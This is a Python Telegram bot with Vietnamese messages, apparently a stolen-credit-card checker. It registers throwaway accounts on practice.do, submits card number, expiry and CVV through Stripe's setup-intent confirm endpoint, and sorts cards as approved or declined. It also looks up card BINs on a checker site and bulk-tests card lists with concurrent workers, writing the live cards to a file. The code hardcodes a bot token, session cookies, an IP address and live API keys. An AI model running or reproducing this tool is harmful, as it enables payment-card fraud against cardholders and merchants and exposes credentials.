import requests, re, time, asyncio
import random, string  # <-- Thêm dòng này
from telegram import Update, InputFile
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from bs4 import BeautifulSoup

# ========== CẤU HÌNH ========== #
TELEGRAM_TOKEN = "7482122603:AAG-d2VwSvySZhKfNYpjz9HXnlduvgETYQ4"
ADMIN_ID = 5127429005
ALLOWED_USERS = {ADMIN_ID}
USER_RANKS = {ADMIN_ID: "admin"}

COOKIES = "referer=; country_code=VN; ip_address=113.172.83.44; agent=Mozilla%2F5.0+%28Windows+NT+10.0%3B+Win64%3B+x64%29+AppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F137.0.0.0+Safari%2F537.36; started_at=2025-07-04+13%3A18%3A34+%2B0400; initialized=true; pixel_session=42fa4f62-24ee-4290-b944-29a1c4b6a040; __stripe_mid=c4954d5a-d300-446d-8144-a7c65563cbac3f9142; __stripe_sid=6147f14c-a06f-420c-a782-594d676d8a2a332b9d; remember_user_token=eyJfcmFpbHMiOnsibWVzc2FnZSI6Ilcxc3lOakV6T1RreE1GMHNJaVF5WVNReE1DUnNNVXhGUm01SFIxRktjVTFKVldRelpIaFViWEoxSWl3aU1UYzFNVFl5TURnNU5pNHhPVGd3TmpZM0lsMD0iLCJleHAiOiIyMDI1LTA3LTE4VDA5OjIxOjM2LjE5OFoiLCJwdXIiOiJjb29raWUucmVtZW1iZXJfdXNlcl90b2tlbiJ9fQ%3D%3D--8527b8dbcf83519531f0efb3138277bed6dca942; user_referrer=https%3A%2F%2Furbanflixtv.com%2Faccount%2Fpurchases; _uscreen2_session=Wuaaj7drKz9cEXYzN8JSMk0CyIVGH%2F5LobLcSzp2j5KpnpWRbQyfWaB9TjyiAvv625X0S9O%2BqY5gR8apPLMoTR1VJ5DCsKr6wQVREGRZDluhZDYdduMptP%2FI37guWMtI%2BfXKIAOieSuwort4XeQaZCJHecqesYujxG2vCkT62oyYFpVBKK9QTcn37B7pH5mVOCAjPzKQeZhz8zg7m9uM6SkuFbs3qTu1oVpqTDiwNj896tqiY4Do2N2PgLH9zl%2FAhABhKFpkhup3XV850HgPONukbRcge%2BqIB9xpwUPL1CfVofj2QQaQuQwjBLc55Fo2LA4ah9CUh17aJ4vAZ0tP%2B4OHlBFyoeY%2BFdIxtn8VihCWwizY%2F%2B57IB3eahWEkGGnjhcNDws382eKoiWpjIeT60ya0SjDL2SFDTw60CBs%2BiQGjaJ0WtmdiyU%3D--%2FMF2m6h5yj3XpgiU--7WSv5xuZvzz5%2FzO0g7tDLg%3D%3D"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "cookie": COOKIES
}

# ========== HÀM XỬ LÝ THẺ ========== #
async def process_card(cc, mes, ano, cvv, user_id=None):
    def random_email():
        prefix = ''.join(random.choices(string.ascii_lowercase, k=18))
        return f"{prefix}62@gmail.com"

    start_time = time.time()
    try:
        email = random_email()
        payload1 = {
            "email": email,
            "isCoach": True,
            "password": "Minhnhat##123",
            "firstName": "Nhat",
            "lastName": "Minh"
        }
        headers_json = {
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
            "Pragma": "no-cache",
            "Accept": "*/*"
        }

        # Tạo user
        r1 = requests.post("https://app.practice.do/api/v1/users/create", json=payload1, headers=headers_json)
        if "Email already in use" in r1.text:
            return "❌ Email đã được sử dụng."

        # Lấy token đăng nhập
        r2 = requests.post(
            "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyChZfnLzMeEIDjQ8XSw3y9sO7jp0O4lkIk",
            json={
                "returnSecureToken": True,
                "email": email,
                "password": "Minhnhat##123",
                "clientType": "CLIENT_TYPE_WEB"
            },
            headers=headers_json
        )
        tk = r2.json().get("idToken")
        if not tk:
            return "❌ Không đăng nhập được (không lấy được token)."

        headers_token = {
            "host": "app.practice.do",
            "accept": "application/json, text/plain, */*",
            "content-length": "0",
            "origin": "https://app.practice.do",
            "pragma": "no-cache",
            "user-agent": headers_json["User-Agent"],
            "cookie": f"firebase_token={tk}"
        }
        r3 = requests.post(
            "https://app.practice.do/api/v1/users/zy9ODRErt6VR2i98vmtMUPNkL533/stripe/setup-intent",
            headers=headers_token
        )
        src = r3.text
        d = r3.json().get("clientSecret", "")
        n = src.split("\"clientSecret\":\"")[1].split("_secret_")[0]

        # Gửi lên Stripe đúng chuẩn
        form_data = {
            "return_url": f"https://app.practice.do/start-trial?step=2&email={email}&planInformation=%257B%2522name%2522%253A%2522Basic%2522%252C%2522priceId%2522%253A%2522price_1O9UHlDXXMkswpxpZ6L912U1%2522%252C%2522tier%2522%253A%2522basic%2522%252C%2522frequency%2522%253A%2522month%2522%252C%2522amount%2522%253A5%252C%2522currency%2522%253A%2522usd%2522%257D",
            "payment_method_data[type]": "card",
            "payment_method_data[card][number]": cc,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_year]": ano,
            "payment_method_data[card][exp_month]": mes,
            "payment_method_data[allow_redisplay]": "unspecified",
            "payment_method_data[billing_details][address][country]": "VN",
            "payment_method_data[pasted_fields]": "number",
            "payment_method_data[payment_user_agent]": "stripe.js/2b21fdf9ae; stripe-js-v3/2b21fdf9ae; payment-element",
            "payment_method_data[referrer]": "https://app.practice.do",
            "payment_method_data[time_on_page]": "15258",
            "payment_method_data[client_attribution_metadata][client_session_id]": "7308a4fd-b6e8-4919-8480-f8c9baf770e0",
            "payment_method_data[client_attribution_metadata][merchant_integration_source]": "elements",
            "payment_method_data[client_attribution_metadata][merchant_integration_subtype]": "payment-element",
            "payment_method_data[client_attribution_metadata][merchant_integration_version]": "2021",
            "payment_method_data[client_attribution_metadata][payment_intent_creation_flow]": "standard",
            "payment_method_data[client_attribution_metadata][payment_method_selection_flow]": "merchant_specified",
            "payment_method_data[guid]": "f8f17c37-ca8b-4c7c-bdf0-6b8cd5bd2ab25eb368",
            "payment_method_data[muid]": "c2de6ae0-e50e-4547-bb09-debe6a55ec13709f78",
            "payment_method_data[sid]": "9d49c487-2b7a-47d2-9b3b-264f73b4073d616e77",
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "key": "pk_live_8vuRcdG8hx5kBi7MTtoqIeCc00alpMFwtE",
            "client_secret": d
        }
        headers_form = {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": headers_json["User-Agent"],
            "Pragma": "no-cache",
            "Accept": "*/*"
        }
        r4 = requests.post(f"https://api.stripe.com/v1/setup_intents/{n}/confirm", data=form_data, headers=headers_form)
        j4 = r4.json()
        status = j4.get("status", "UNKNOWN")
        decline = j4.get("decline_code", "NONE")

        # Phân loại trạng thái trả về đúng chuẩn
        status_label = "❓ Unknown Status"
        if status == "succeeded":
            status_label = "✅ Approved"
        elif status in ["requires_action", "requires_source_action"]:
            status_label = "⚠️ Requires 3DS / Action"
        elif decline == "insufficient_funds":
            status_label = "⚠️ Insufficient Funds"
        elif decline in ["incorrect_cvc", "invalid_cvc"]:
            status_label = "⚠️ Invalid CVC"
        elif decline in [
            "transaction_not_allowed", "generic_decline", "fraudulent", "live_mode_test_card",
            "incorrect_number", "card_not_supported", "pickup_card", "processing_error",
            "do_not_honor", "stolen_card", "invalid_account"
        ] or status == "requires_payment_method":
            status_label = "❌ Declined"

        # Check BIN
        bin_code = cc[:6]
        bin_res = requests.get(f"https://new.checkerccv.tv/bin_lookup.php?bin={bin_code}")
        bin_json = bin_res.json()
        card = bin_json.get("scheme", "N/A")
        type_ = bin_json.get("type", "N/A")
        brand = bin_json.get("brand", "N/A")
        alpha2 = bin_json.get("country", {}).get("alpha2", "N/A")
        bank = bin_json.get("bank", {}).get("name", "N/A")

        elapsed = round(time.time() - start_time, 2)
        return f"""
<b>✅ CHECK RESULT</b>

<b>CC:</b> {cc}|{mes}|{ano}|{cvv}
<b>Status:</b> {status_label}
<b>Decline Code:</b> {decline}

<b>Gateway:</b> Practice.do → Stripe
<b>Card:</b> {card.upper()}
<b>Type:</b> {type_.capitalize()}
<b>Brand:</b> {brand}
<b>Alpha2:</b> {alpha2}
<b>Bank:</b> {bank}

<b>Took:</b> {elapsed} sec
<b>Checked by:</b> mnhat [{user_id}]
"""
    except Exception as e:
        return f"❌ Lỗi xử lý: {str(e)}"

# ========== CÁC HÀM COMMAND ========== #
async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Bạn không có quyền sử dụng bot.")
        return
    if not context.args:
        await update.message.reply_text("❌ Dùng: /chk cc|mes|ano|cvv")
        return
    raw = context.args[0]
    match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', raw)
    if not match:
        await update.message.reply_text("❌ Sai cú pháp.")
        return
    await update.message.reply_text("🕐 Đang kiểm tra...")
    result = await process_card(*match.groups(), user_id)
    await update.message.reply_html(result)

async def chkall_generic(update: Update, context: ContextTypes.DEFAULT_TYPE, max_concurrent: int = 5):
    user_id = update.effective_user.id
    if user_id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Bạn không có quyền.")
        return
    lines = update.message.text.strip().splitlines()[1:]
    await update.message.reply_text(f"🔄 Đang xử lý {len(lines)} thẻ với {max_concurrent} luồng...")
    results = []
    sem = asyncio.Semaphore(max_concurrent)
    async def worker(line):
        match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', line.strip())
        if not match:
            results.append(f"❌ Sai cú pháp: {line}")
            return
        async with sem:
            res = await process_card(*match.groups(), user_id)
            results.append(res)
    await asyncio.gather(*(worker(line) for line in lines))
    for chunk in range(0, len(results), 30):
        await update.message.reply_html("\n".join(results[chunk:chunk+30]))

async def chkall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await chkall_generic(update, context, max_concurrent=5)

async def multi(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id not in ALLOWED_USERS:
        await update.message.reply_text("❌ Bạn không có quyền.")
        return
    path = "cards.txt"
    try:
        with open(path, "r", encoding="utf-8") as f:
            cards = [line.strip() for line in f if line.strip()]
    except:
        await update.message.reply_text("❌ Không tìm thấy file cards.txt")
        return
    results, approved, declined = [], [], []
    await update.message.reply_text(f"🔁 Bắt đầu kiểm tra {len(cards)} dòng...")
    sem = asyncio.Semaphore(5)
    async def worker(card):
        match = re.match(r'^(\d{12,19})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})$', card)
        if not match:
            return
        async with sem:
            res = await process_card(*match.groups(), update.effective_user.id)
            if "✅ Approved" in res:
                approved.append(card)
            else:
                declined.append(card)
    await asyncio.gather(*(worker(c) for c in cards))
    with open("fileApproved.txt", "w") as f:
        f.write("\n".join(approved))
    with open("fileDecline.txt", "w") as f:
        f.write("\n".join(declined))
    await update.message.reply_document(InputFile("fileApproved.txt"))
    await update.message.reply_document(InputFile("fileDecline.txt"))

async def add_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_ID:
        await update.message.reply_text("❌ Bạn không phải quản trị viên.")
        return
    if not context.args:
        await update.message.reply_text("Dùng: /add <user_id>")
        return
    try:
        new_id = int(context.args[0])
        ALLOWED_USERS.add(new_id)
        USER_RANKS[new_id] = "member"
        await update.message.reply_text(f"✅ Đã thêm user {new_id} với quyền member.")
    except Exception as e:
        await update.message.reply_text(f"❌ Lỗi: {str(e)}")

async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    rank = USER_RANKS.get(user.id, "none")
    msg = f"""
👤 <b>Thông tin người dùng</b>

<b>Tên:</b> {user.full_name}
<b>ID:</b> {user.id}
<b>Rank:</b> {rank}
"""
    await update.message.reply_html(msg)

async def help_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """
<b>🔊 Hướng dẫn lệnh</b>

<b>/chk</b> cc|mes|ano|cvv — Kiểm tra 1 thẻ
<b>/chkall</b> \ncc|mes|ano|cvv... — Kiểm tra nhiều thẻ (5 luồng)
<b>/chkallX</b> (X = số luồng, vd /chkall10)
<b>/multi</b> — Kiểm tra file cards.txt (tự ghi kết quả)
<b>/add</b> user_id — Thêm người dùng
<b>/info</b> — Thông tin người dùng
<b>/help</b> — Danh sách lệnh
bot by: mn
"""
    await update.message.reply_html(msg)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = """
<b>🔊 Hướng dẫn lệnh</b>

<b>/chk</b> cc|mes|ano|cvv — Kiểm tra 1 thẻ
<b>/chkall</b> \ncc|mes|ano|cvv... — Kiểm tra nhiều thẻ (5 luồng)
<b>/chkallX</b> (X = số luồng, vd /chkall10)
<b>/multi</b> — Kiểm tra file cards.txt (tự ghi kết quả)
<b>/add</b> user_id — Thêm người dùng
<b>/info</b> — Thông tin người dùng
<b>/help</b> — Danh sách lệnh
bot by: mn
"""
    await update.message.reply_html(msg)

# ========== CHẠY BOT ========== #
if __name__ == '__main__':
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
    app.add_handler(CommandHandler("chk", chk))
    app.add_handler(CommandHandler("add", add_user))
    app.add_handler(CommandHandler("info", info))
    app.add_handler(CommandHandler("chkall", chkall))
    app.add_handler(CommandHandler("multi", multi))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("start", start))
    for i in range(1, 21):
        app.add_handler(CommandHandler(f"chkall{i}", lambda u, c, i=i: chkall_generic(u, c, i)))
    print("✅ Bot đang chạy...")
    app.run_polling()
